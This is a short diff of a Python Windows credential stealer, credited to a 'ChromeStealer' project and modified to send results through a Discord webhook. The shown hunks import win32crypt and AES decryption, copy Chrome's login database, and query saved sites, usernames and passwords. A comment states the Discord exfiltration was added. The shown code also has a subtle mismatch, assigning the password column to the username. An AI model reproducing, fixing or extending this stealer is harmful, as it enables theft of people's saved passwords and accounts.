@@ -1,8 +1,11 @@
+# Original author: codeuk
+# Github: https://github.com/codeuk/ChromeStealer
+# I just modified it with support for Discord :)
+
 import os
 if os.name != "nt":
     exit()
-import json,base64,sqlite3,time,win32crypt,shutil
-from colorama import Fore
+import json,base64,sqlite3,datetime,win32crypt,shutil
 from Crypto.Cipher import AES
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
@@ -55,7 +58,7 @@ def main():
     shutil.copyfile(db_path, filename) 
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    cursor.execute("select origin_url, username_value, password_value)
+    cursor.execute("select origin_url, username_value, password_value")
     for row in cursor.fetchall():
         origin_url = row[0]
         username = row[2]
